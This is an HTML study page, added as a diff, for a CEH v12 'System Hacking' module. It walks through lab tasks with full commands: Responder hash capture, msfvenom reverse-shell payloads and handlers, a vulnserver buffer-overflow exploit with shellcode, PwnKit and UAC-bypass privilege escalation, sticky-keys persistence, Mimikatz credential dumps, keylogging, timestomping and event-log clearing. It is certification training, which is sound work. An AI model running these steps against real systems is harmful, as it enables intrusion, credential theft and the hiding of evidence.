@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 06 - System Hacking</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav>
+        <h1>[MISSION_CONTROL]</h1>
+        <div class="search-wrap">
+            <input id="globalSearch" type="text" placeholder="Search modules...">
+            <div id="searchResults"></div>
+        </div>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">☰</button>
+    <ul id="navMenu">
+            <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+            <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+            <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+            <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+            <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+            <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+        <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+        <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+        <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+        <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+        <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+        <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+        <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
+        </ul>
+        <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
+    </nav>
+    <main class="content-body">
+        <div class="window">
+            <div class="module-header">
+                <span>CEH v12 - Module 06</span>
+                <h2 class="hero-3d">System Hacking</h2>
+            </div>
+
+            <p>System hacking is the next step after footprinting, scanning, enumeration, and vulnerability analysis. It includes gaining access, escalating privileges, maintaining access, and clearing logs. Labs use Parrot Security (10.10.1.13), Windows 11 (10.10.1.11), Windows Server 2022 (10.10.1.22), Windows Server 2019 (10.10.1.19), and Ubuntu (10.10.1.9). Always obtain proper authorization.</p>
+
+            <section class="lab-task">
+                <h3>Part 1 - Gaining Access: Task 1: Perform Active Online Attack to Crack the System's Password using Responder</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Responder / John the Ripper</span>
+                    <p><strong>What/when:</strong> LLMNR/NBT-NS/MDNS poisoner that captures NTLM hashes from broadcast name-resolution requests. Use in internal network pentests when awareness of LLMNR poisoning is low. Attacker Parrot 10.10.1.13; target Windows 11 10.10.1.11 (user Jason). Responder listens on the network interface and spoofs the requested server; the victim accepts the connection and Responder captures the NTLM username and password hash. Logs stored in /usr/share/responder/logs. Crack captured hash with John the Ripper.</p>
+                    <pre><code># Check network interface name (eth0 may differ)
+ifconfig
+
+# Start Responder on interface
+sudo responder -I eth0
+
+# After capturing hash: escalate to root, save hash, crack
+sudo su
+pluma hash.txt
+john hash.txt
+                    </code></pre>
+                    <pre><code># Verification: recovered plaintext password displayed by John
+john hash.txt
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Sign in to Parrot Security with password toor, then switch to Windows 11 and sign in as Jason with password qwerty (handle privacy wizard if shown). Open Terminal on Parrot, run sudo responder -I eth0 (password toor; -I specifies interface; verify with ifconfig). Switch to Windows 11, right-click Start → Run, type \\CEH-Tools, OK. Leave Windows 11 running. Switch back to Parrot; Responder captures access logs and collects the NTLM hash of the logged-in user (Jason) and stores logs in /usr/share/responder/logs. Select and copy Jason's hash. Open terminal, run sudo su then pluma hash.txt, paste hash, save and close. Run john hash.txt; John the Ripper cracks and displays the plaintext password. Concludes demonstration. Close all windows and document. Sign out Jason on Windows 11 (handle Network Error pop-up if shown).</p>
+                    <p><strong>Notes:</strong> By default Responder only responds to File Server Service requests (SMB). Password typed in sudo prompts is not visible. Interface name may differ (verify via ifconfig).</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 1 - Gaining Access: Task 2: Audit System Passwords using L0phtCrack</h3>
+                <div class="section-card">
+                    <span class="tool-tag">L0phtCrack 7</span>
+                    <p><strong>What/when:</strong> GUI password auditing over SMB against a remote host (Windows Server 2022 10.10.1.22). L0phtCrack recovers Windows passwords via dictionary, hybrid, rainbow table, and brute-force attacks and checks password strength. No CLI commands; use Password Auditing Wizard (target 10.10.1.22, Administrator/Pa$$w0rd, Thorough Password Audit, CSV report). User account passwords cracked quickly are weak; strengthen password policy.</p>
+                    <pre><code># No CLI commands; GUI wizard configuration values:
+# Host: 10.10.1.22 (Windows Server 2022)
+# Username: Administrator ; Password: Pa$$w0rd ; Domain: CEH.com (if applicable)
+# Audit type: Thorough Password Audit
+# Report: Generate Report at End of Auditing (CSV)
+# Job: Run this job immediately
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 sign in as Admin with Pa$$w0rd (handle Welcome/Networks wizards). Search l0phtcrack → open L0phtCrack 7 → Password Auditing Wizard → Next. Choose Target System Type: Windows → Next. Windows Import: A remote machine → Next. Windows Import From Remote Machine (SMB): Host 10.10.1.22, Use Specific User Credentials, Username Administrator, Password Pa$$w0rd, Domain CEH.com if applicable → Next. Choose Audit Type: Thorough Password Audit → Next. Reporting Options: Generate Report at End of Auditing, CSV report type, Browse to Desktop → Save → Next. Job Scheduling: Run this job immediately → Next. Summary → Finish. L0phtCrack cracks remote passwords; status in lower-right corner. After completion shows cracked passwords; stop. Concludes demonstration. Close windows and document.</p>
+                    <p><strong>Notes:</strong> It takes time to crack all passwords. Trial version may show notifications.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 1 - Gaining Access: Task 3: Find Vulnerabilities on Exploit Sites</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Exploit-DB / VulDB / MITRE CVE / Vulners / CIRCL CVE Search</span>
+                    <p><strong>What/when:</strong> Browser-based vulnerability research; no CLI. Exploit sites contain latest vulnerabilities of OSes, devices, applications. Use gathered target info to find relevant vulnerabilities and download exploit code for use with Metasploit. Advanced search by type (remote) and platform (Windows_x86-64).</p>
+                    <pre><code># Browser URLs
+https://www.exploit-db.com/
+https://vuldb.com
+https://cve.mitre.org
+https://vulners.com
+https://cve.circl.lu
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 open Firefox. Browse https://www.exploit-db.com/. View latest vulnerabilities or search. Left pane → SEARCH EDB advanced search. Type: remote; Platform: Windows_x86-64; click Search. Scroll results; click vulnerability (e.g., CloudMe Sync 1.11.2 Buffer Overflow - WoW64 DEP Bypass). View details (CVE ID, author, type, platform, published date). Click download icon in Exploit section. Navigate to Downloads, right-click saved file → Show more options → Edit with Notepad++ (click No on update pop-up). Exploit code displayed; can be used to exploit target. Close windows. Similarly use VulDB, MITRE CVE, Vulners, CIRCL CVE Search.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 1 - Gaining Access: Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit (msfvenom / msfconsole)</span>
+                    <p><strong>What/when:</strong> Generate reverse TCP payload, host via Apache, catch Meterpreter session; upload PowerSploit PowerUp.ps1 for privesc checks, then launch VNC. Demonstrates exploitation of weakly patched Windows 11 to gain remote access/control. Attacker Parrot 10.10.1.13; target Windows 11 10.10.1.11.</p>
+                    <pre><code># Root shell on attacker
+sudo su
+
+# Generate malicious executable payload
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=444 -o /home/attacker/Desktop/Test.exe
+
+# Prepare shared web directory and serve payload
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/Desktop/Test.exe /var/www/html/share
+service apache2 start
+
+# Launch Metasploit handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+set LPORT 444
+exploit
+                    </code></pre>
+                    <pre><code># In Meterpreter: verify target, upload PowerUp, run checks, open VNC
+sysinfo
+upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
+shell
+powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
+exit
+run vnc
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Sign in Parrot (attacker/toor) ignoring updater pop-ups. Open Terminal, sudo su (password toor). Generate Test.exe payload. Create share dir, set perms, copy payload, start Apache. Launch msfconsole, use multi/handler, set payload/LHOST/LPORT, exploit (listener). Switch to Windows 11, open Firefox, browse http://10.10.1.13/share, download Test.exe (10.10.1.13 is Parrot). Run Test.exe, click Run on security warning. Leave Windows 11 running, switch to Parrot. Session opens; if not auto-connected use sessions -i 1. sysinfo verifies target. Upload PowerUp.ps1 (PowerSploit privesc quick checks) to target pwd. shell → powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks" (ensure space after dot). Exit back to Meterpreter. run vnc opens VNC session showing victim activity. Concludes. Close windows and document.</p>
+                    <p><strong>Notes:</strong> Payload can be delivered via email attachment or physical media in real time. PowerUp checks misconfigured services, unquoted paths, registry autoruns, etc.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 1 - Gaining Access: Task 5: Gain Access to a Remote System using Armitage</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Armitage (Metasploit GUI)</span>
+                    <p><strong>What/when:</strong> Scriptable red-team collaboration tool for Metasploit: visualizes targets, recommends exploits, exposes post-exploitation. Create sessions, share hosts, capture data, download files, shared event log, bots. Attacker Parrot; target Windows 11. Uses PostgreSQL DB.</p>
+                    <pre><code># Attacker root shell
+sudo su
+cd
+
+# Start DB and Apache
+service postgresql start
+service apache2 start
+
+# Copy prebuilt payload
+cp /root/Desktop/malicious_payload.exe /var/www/html/share/
+
+# (optional create share dir)
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+
+# Meterpreter verification
+sysinfo
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Restart Windows 11, sign in Admin (Pa$$w0rd). On Parrot open Terminal, sudo su (toor), cd, service postgresql start. Launch Armitage via Applications → Pentesting → Exploitation Tools → Metasploit Framework → armitage; security pop-up password toor; Connect default; Start Metasploit? Yes. Hosts → Nmap Scan → Intense Scan → input 10.10.1.11 → OK; after scan OK. Target host appears with Windows logo. Left pane expand payload → windows → meterpreter; double-click meterpreter_reverse_tcp; set LPORT 444; Output exe; Launch; Save as malicious_payload.exe on Desktop; OK. Reuse/create share dir, copy payload, start Apache. In Armitage double-click meterpreter_reverse_tcp again; LPORT 444; Output multi/handler; Launch. On Windows 11 browse http://10.10.1.13/share, download malicious_payload.exe, run, click Run. Session opens; host icon shows WINDOWS11. Right-click host → Meterpreter 1 → Interact → Meterpreter Shell; sysinfo. Explore → Browse Files (view Downloads, upload/mkdir/list drives); Screenshot. Other options: Desktop (VNC), Show Processes, Log Keystrokes, Webcam Shot. Escalate privileges, steal tokens, dump hashes. Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 1 - Gaining Access: Task 6: Gain Access to a Remote System using Ninja Jonin</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Ninja Jonin</span>
+                    <p><strong>What/when:</strong> Combination of two tools: Ninja installed on victim, Jonin on attacker. Controls remote machine behind NAT, firewall, proxy. Attacker Windows 11 (10.10.1.11) runs Jonin listener; target Windows Server 2022 (10.10.1.22) runs Ninja agent.</p>
+                    <pre><code># Listener (Windows 11)
+Jonin-v1.1.0-win.exe   # press any key to start listener
+
+# Ninja config (constants.json)
+Name: Server22
+Host: 10.10.1.11
+
+# Jonin console commands
+list
+connect 1
+change   # Enter Type: cmd
+ipconfig
+whoami
+#help
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 navigate to E:\CEH-Tools\...\Ninja Jonin, copy Jonin-v1.1.0-win.zip and Ninja-v1.2.1-win.zip to C:\Users\Admin\Desktop. Extract Jonin here. Create Trial-Version folder. Extract Ninja into Trial-Version. Edit Trial-Version\config\constants.json with Notepad (More apps → Notepad): Name Server22, Host 10.10.1.11; save. Archive Trial-Version folder as ZIP (WinRAR Add to archive, ZIP format). Run Jonin-v1.1.0-win.exe on Desktop, press any key to start listener. Copy Trial-Version.zip to E:\CEH-Tools\...\Spyware. Switch to Windows Server 2022, sign in CEH\Administrator (Pa$$w0rd). Copy Trial-Version.zip from Z: to Desktop, extract here. Run Ninja-v1.2.1-win.exe, press any key to connect. On Windows 11 maximize Jonin listener. list shows Server22 with index 1. connect 1. change → Enter Type cmd. ipconfig shows victim IP. whoami shows logged user. #help lists commands. Functions include upload/download. Concludes. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 1 - Gaining Access: Task 7: Perform Buffer Overflow Attack to Gain Access to a Remote System</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Vulnserver + Immunity Debugger + SPIKE + Python + msfvenom + nc</span>
+                    <p><strong>What/when:</strong> Buffer overflow in vulnserver TRUN command (port 9999) on Windows 11 10.10.1.11; attacker Parrot 10.10.1.13. Process: run vulnserver under Immunity Debugger, spike to find vulnerable function, fuzz, generate pattern and find offset, overwrite EIP, identify bad chars, find unprotected module (essfunc.dll) and JMP ESP, inject shellcode, get reverse shell.</p>
+                    <pre><code># Connect to vulnserver and inspect commands
+nc -nv 10.10.1.11 9999
+# HELP ; EXIT
+
+# SPIKE templates
+pluma stats.spk
+# content:
+# s_readline();
+# s_string("STATS ");
+# s_string_variable("0");
+generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
+
+pluma trun.spk
+# content:
+# s_readline();
+# s_string("TRUN ");
+# s_string_variable("0");
+generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
+
+# Fuzzing
+cd /home/attacker/Desktop/Scripts/
+chmod +x fuzz.py
+./fuzz.py
+                    </code></pre>
+                    <pre><code># Generate pattern and find offset
+cd
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900
+pluma findoff.py
+chmod +x findoff.py
+./findoff.py
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337
+
+# Overwrite EIP check
+chmod +x overwrite.py
+./overwrite.py
+
+# Bad chars
+chmod +x badchars.py
+./badchars.py
+                    </code></pre>
+                    <pre><code># Find JMP ESP in essfunc.dll (Immunity)
+# !mona modules ; !mona find -s "\xff\xe4" -m essfunc.dll
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+# JMP ESP -> FFE4 ; EXIT
+
+# Jump test
+chmod +x jump.py
+./jump.py
+
+# Generate shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.13 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+pluma shellcode.py
+chmod +x shellcode.py
+
+# Listener and exploit
+nc -nvlp 4444
+./shellcode.py
+# in shell: whoami
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 run vulnserver.exe as admin (allow firewall); minimize. Install Immunity Debugger as admin (install Python). Open Immunity as admin, File → Attach → vulnserver → Attach; status Paused; click Run (Running). Switch to Parrot. nc -nv 10.10.1.11 9999; Welcome message; HELP lists commands; EXIT. Create stats.spk with SPIKE template; generic_send_tcp; STATS not vulnerable (Immunity still Running). Ctrl+C. Create trun.spk; generic_send_tcp; TRUN pauses Immunity (buffer overflow), EAX/ESP/EBP/EIP overwritten with "A". Ctrl+Z. Close Immunity/vulnserver; relaunch both as admin and attach/run. Copy Scripts folder from Windows share to Parrot Desktop via SMB (smb://10.10.1.11, Admin/Pa$$w0rd, CEH-Tools → Buffer Overflow Tools → Scripts). cd Scripts; chmod +x fuzz.py; ./fuzz.py; vulnserver receives growing buff; Immunity eventually Paused; EIP not overwritten; Ctrl+C; message ~11800 bytes crashed server. Close/relaunch. Generate pattern length 11900, copy. pluma findoff.py, replace offset string with pattern, save. chmod +x findoff.py; ./findoff.py sends pattern; Immunity EIP overwritten with random bytes (note value). Open new terminal root; pattern_offset.rb -l 11900 -q 386F4337 → offset 2003. Close terminal. Close/relaunch Immunity/vulnserver. chmod +x overwrite.py; ./overwrite.py to test EIP control (EIP overwritten). Close/relaunch. badchars.py sends bad chars; in Immunity follow ESP in dump; no bad chars found. Close/relaunch. Copy mona.py to C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands. In Immunity !mona modules → essfunc.dll has no protections. nasm_shell.rb: JMP ESP → FFE4. !mona find -s "\xff\xe4" -m essfunc.dll → return address 0x625011af. Close/relaunch; Go to address 625011af; F2 breakpoint; Run. chmod +x jump.py; ./jump.py; Immunity EIP overwritten with return address. Close/relaunch vulnserver only. Generate shellcode with msfvenom (LHOST 10.10.1.13 LPORT 4444, bad char \x00), copy. pluma shellcode.py, paste shellcode into overflow line, save. New terminal root: nc -nvlp 4444. chmod +x shellcode.py; ./shellcode.py. Netcat receives shell; whoami. Concludes. Close all; document. Restart Parrot and Windows 11.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 2 - Privilege Escalation: Task 1: Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities</h3>
+                <div class="section-card">
+                    <span class="tool-tag">BeRoot / Seatbelt / Metasploit (bypassuac_fodhelper)</span>
+                    <p><strong>What/when:</strong> Generate encoded payload, catch session, run BeRoot and Seatbelt for misconfigurations, then bypass UAC via FodHelper and getsystem named-pipe impersonation. Attacker Parrot 10.10.1.13; target Windows 11 10.10.1.11. BeRoot/Seatbelt assess services, permissions, kernel, architecture; Windows privileges (SeDebug, SeRestore, etc.) can be abused.</p>
+                    <pre><code># Root shell
+sudo su
+cd
+
+# Generate payload
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe
+
+# Share & serve
+ls -la /var/www/html/ | grep share
+cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+exploit -j -z
+                    </code></pre>
+                    <pre><code># In Meterpreter
+sessions -i 1
+getuid
+
+# Upload BeRoot and run
+upload /home/attacker/Desktop/BeRoot/beRoot.exe
+shell
+beRoot.exe
+exit
+
+# Upload Seatbelt and run
+upload /home/attacker/Desktop/Seatbelt.exe
+shell
+Seatbelt.exe -group=system
+Seatbelt.exe -group=user
+Seatbelt.exe -group=misc
+exit
+
+# Hashdump attempt, UAC bypass, getsystem
+run post/windows/gather/smart_hashdump
+getsystem -t 1
+background
+use exploit/windows/local/bypassuac_fodhelper
+show options
+set SESSION 1
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getuid
+getsystem -t 1
+getuid
+run post/windows/gather/smart_hashdump
+clearev
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Terminal sudo su (toor), cd. Generate Exploit.exe with shikata_ga_nai encoder, null-byte bad char. Verify share dir, copy payload, start Apache. msfconsole handler multi/handler, set payload/LHOST, exploit -j -z (background). Windows 11 sign in Admin (Pa$$w0rd), browse http://10.10.1.13/share, download/run Exploit.exe (Run on security warning). Leave running, switch to Parrot; session opens. sessions -i 1; getuid shows WINDOWS11\Admin. Copy BeRoot folder from Windows share (CEH-Tools → Privilege Escalation Tools) to Parrot Desktop via SMB if needed; upload beRoot.exe to target pwd; shell; beRoot.exe shows services, permissions, keys, writable dirs, startup keys, tasks, WebClient vulns, privileges. exit. Copy Seatbelt.exe from Windows share (Github Tools); upload; shell; run Seatbelt groups system/user/misc (AMSI, AV, AppLocker, Chromium, creds, dir, DPAPI, etc.). exit. smart_hashdump fails "Insufficient privileges". getsystem -t 1 fails. background. bypassuac_fodhelper (FodHelper registry key). set SESSION 1, payload, LHOST, TARGET 0. exploit bypasses UAC; new session. getuid still normal; getsystem -t 1 now "got system"; getuid shows NT AUTHORITY\SYSTEM. smart_hashdump extracts NTLM hashes. clearev clears event logs. Concludes. Close windows and document. Restart Parrot.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 2 - Privilege Escalation: Task 2: Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit / Meterpreter</span>
+                    <p><strong>What/when:</strong> Generate backdoor, catch session, enumerate and manipulate target. Post-exploitation includes sysinfo, ipconfig, getuid, pwd, ls, cat, timestomp (MACE), cd, search, keylogging, idletime, shell, hidden dirs, services, firewall, installed software, CPU, users/SIDs, reboot. Target Windows 11; attacker Parrot.</p>
+                    <pre><code># Payload and share
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
+cp /home/attacker/Desktop/Backdoor.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+show options
+exploit -j -z
+                    </code></pre>
+                    <pre><code># Meterpreter enumeration and post-exploitation
+sessions -i 1
+sysinfo
+ipconfig
+getuid
+pwd
+ls
+cat Secret.txt
+
+# MACE timestamps
+timestomp Secret.txt -v
+timestomp Secret.txt -m "02/11/2018 08:10:03"
+timestomp Secret.txt -v
+
+# Navigation and search
+cd C:/
+pwd
+search -f pagefile.sys
+
+# Keylogging
+keyscan_start
+keyscan_dump
+idletime
+
+# Shell queries
+shell
+dir /a:h
+sc queryex type=service state=all
+netsh firewall show state
+netsh firewall show config
+wmic /node:"" product get name,version,vendor
+wmic cpu get
+wmic useraccount get name,sid
+wmic os where Primary='TRUE' reboot
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows 11 create Secret.txt in C:\Users\Admin\Downloads with text "My credit card account number is 123456789." (for post-exploitation demo). Parrot Terminal sudo su (toor), cd. Generate Backdoor.exe. Copy to share, start Apache. msfconsole handler, set payload/LHOST, show options (port), exploit -j -z. Windows 11 browse http://10.10.1.13/share, download Backdoor.exe (ensure same dir as Secret.txt), run, click Run. Leave running, switch to Parrot; session opens. sessions -i 1. sysinfo shows computer/OS/domain. ipconfig shows IP/MAC. getuid shows administrator. pwd shows current working dir (Downloads). ls lists files. cat Secret.txt reads content. timestomp Secret.txt -v shows created/accessed/modified/entry modified; timestomp -m changes Modified; verify. cd C:/ changes remote dir; pwd confirms. search -f pagefile.sys locates file. keyscan_start captures keystrokes; switch to Windows 11 and type in a text file; switch back; keyscan_dump dumps captured keys. idletime shows idle duration. shell opens cmd; dir /a:h lists hidden; sc queryex lists all services; netsh firewall show state/config; wmic product lists installed software; wmic cpu; wmic useraccount get name,sid; wmic os where Primary='TRUE' reboot reboots target (session dies). Concludes. Close windows and document. Restart Parrot.</p>
+                    <p><strong>Notes:</strong> timestomp modifies MACE attributes to hide access. Session dies on reboot.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 2 - Privilege Escalation: Task 3: Escalate Privileges by Exploiting Vulnerability in pkexec</h3>
+                <div class="section-card">
+                    <span class="tool-tag">pkexec (CVE-2021-4034 / PwnKit)</span>
+                    <p><strong>What/when:</strong> Polkit pkexec local privilege escalation on Parrot. pkexec.c mishandles parameters, allowing environment variables to be executed as commands. Attackers craft environment variable to make pkexec execute arbitrary code. Use PoC to escalate from standard user to root without credentials. Exploit shown in Module 05 CVE research.</p>
+                    <pre><code>whoami
+mkdir /tmp/pwnkit
+mv CVE-2021-4034 /tmp/pwnkit/
+cd /tmp
+cd pwnkit
+cd CVE-2021-4034/
+make
+./cve-2021-4034
+# in shell:
+whoami
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Parrot open Terminal. whoami shows non-root. mkdir /tmp/pwnkit. mv CVE-2021-4034 /tmp/pwnkit/. cd /tmp; cd pwnkit; cd CVE-2021-4034/. make compiles. ./cve-2021-4034 opens shell. whoami shows root. Concludes. Vulnerability patched in newer Unix OSes; demo of searching latest vulns via Exploit-DB and exploiting. Close windows and document.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 2 - Privilege Escalation: Task 4: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit (bypassuac_fodhelper, sticky_keys)</span>
+                    <p><strong>What/when:</strong> Generate payload, catch session, bypass UAC via FodHelper registry key, getsystem, then use sticky_keys module to replace sethc.exe with cmd at lock screen for persistent SYSTEM access. Sticky Keys is accessibility feature triggered by pressing Shift 5 times; can yield unauthenticated privileged access.</p>
+                    <pre><code># Generate & serve payload
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>
+                    <pre><code># In session
+sysinfo
+getuid
+background
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+show options
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getsystem -t 1
+getuid
+background
+
+# Sticky keys persistence
+use post/windows/manage/sticky_keys
+sessions
+set session 2
+exploit
+
+# On target lock screen: press Shift 5x, then in cmd:
+whoami
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Terminal sudo su (toor), cd. Generate Windows.exe payload (lhost 10.10.1.13 lport 444). Copy to share, start Apache. msfconsole handler multi/handler, set payload/lhost/lport, run. Windows 11 sign in Admin (Pa$$w0rd), browse http://10.10.1.13/share, download Windows.exe, run, click Run. Leave running, switch to Parrot; session opens. sysinfo; getuid (WINDOWS11\Admin). background. search bypassuac; use bypassuac_fodhelper; set session 1; show options; set LHOST 10.10.1.13; set TARGET 0; exploit bypasses UAC. getsystem -t 1; getuid now NT AUTHORITY\SYSTEM. background. use sticky_keys; sessions; set session 2 (privileged); exploit. On Windows 11 sign out Admin, sign in Martin (apple), lock screen, press Shift 5 times → cmd opens with SYSTEM privileges instead of Sticky Keys error. whoami confirms. Concludes demonstration of persistence via Sticky Keys. Sign out Martin, sign in Admin (Pa$$w0rd). Restart Parrot.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 2 - Privilege Escalation: Task 5: Escalate Privileges to Gather Hashdump using Mimikatz</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit / Kiwi (Mimikatz)</span>
+                    <p><strong>What/when:</strong> Generate backdoor, catch session, bypass UAC, getsystem, load kiwi (Mimikatz), dump SAM/LSA secrets, change Admin password via NTLM hash, verify login. Mimikatz saves/views credentials, dumps passwords from memory, PINs, hashes; supports pass-the-hash/ticket and lateral movement.</p>
+                    <pre><code># Generate & serve
+sudo su
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
+cp /home/attacker/Desktop/backdoor.exe /var/www/html/share/
+service apache2 start
+
+# Handler
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+run
+                    </code></pre>
+                    <pre><code># Session
+sysinfo
+getuid
+background
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+show options
+set LHOST 10.10.1.13
+set TARGET 0
+exploit
+getsystem -t 1
+getuid
+
+# Kiwi/Mimikatz
+load kiwi
+help kiwi
+lsa_dump_sam
+lsa_dump_secrets
+password_change -u Admin -n 92937945b518814341de3f726500d4ff -P password
+lsa_dump_sam
+                    </code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Terminal sudo su (toor), cd. Generate backdoor.exe. Copy to share, start Apache. msfconsole handler. Windows 11 browse http://10.10.1.13/share, download backdoor.exe, run, click Run (source note: one step says Windows.exe; use backdoor.exe). Leave running, switch to Parrot; session opens. sysinfo; getuid. background; bypassuac_fodhelper; set session 1; show options; set LHOST/TARGET; exploit; getsystem -t 1; getuid SYSTEM. load kiwi; help kiwi. lsa_dump_sam dumps NTLM hashes of all users. lsa_dump_secrets dumps LSA secrets (passwords, IE, service, SQL). password_change -u Admin -n &lt;NTLM hash&gt; -P password changes Admin password to "password". lsa_dump_sam again shows new hash. On Windows 11 lock machine; try old password Pa$$w0rd → incorrect; login with new password "password" succeeds. Concludes. Close windows and document. End lab and re-launch to reset machines.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Part 3 - Maintain Access: Task 1: User System Monitoring and Surveillance using Power Spy</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Power Spy / RDP</span>
+                    <p><strong>What/when:</strong> Employee monitoring software to secretly log user activities. RDP from Windows Server 2022 to Windows Server 2019 (Jason/qwerty), install Power Spy, set password test@123, start monitoring, stealth mode (Ctrl+Alt+X to unhide), victim uses IE/Gmail, then review apps/screenshots/websites and uninstall. Power Spy logs via email/FTP or local viewer.</p>
+                    <pre><code># RDP connection
+# Windows Server 2022 -> Remote Desktop Connection
+# Computer: 10.10.1.19 ; User: Jason ; Password: qwerty
+
+# Power Spy hotkey to unhide: Ctrl+Alt+X
+# Power Spy password: test@123
+                    </code></pre>
